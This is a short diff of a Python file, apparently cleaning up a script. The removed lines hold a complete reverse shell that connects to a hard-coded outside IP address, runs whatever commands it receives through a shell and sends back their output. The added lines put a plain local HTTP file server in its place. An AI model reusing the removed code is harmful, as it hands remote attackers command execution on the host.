@@ -1,15 +1,12 @@
-import socket, subprocess
+import http.server
+import socketserver
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("49.50.117.2", PORT))
+PORT = 8080 # Change this value as needed
 
-while True:
-    cmd = s.recv(1024).decode()
-    if cmd == "exit":
-        break
-    else:
-        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-        output, error = process.communicate()
+Handler = http.server.SimpleHTTPRequestHandler
+httpd = socketserver.TCPServer(("", PORT), Handler)
 
-        # Send the output back to the server.
-        s.send(output + error)
+print("Serving at port", PORT)
+httpd.serve_forever()
+
+
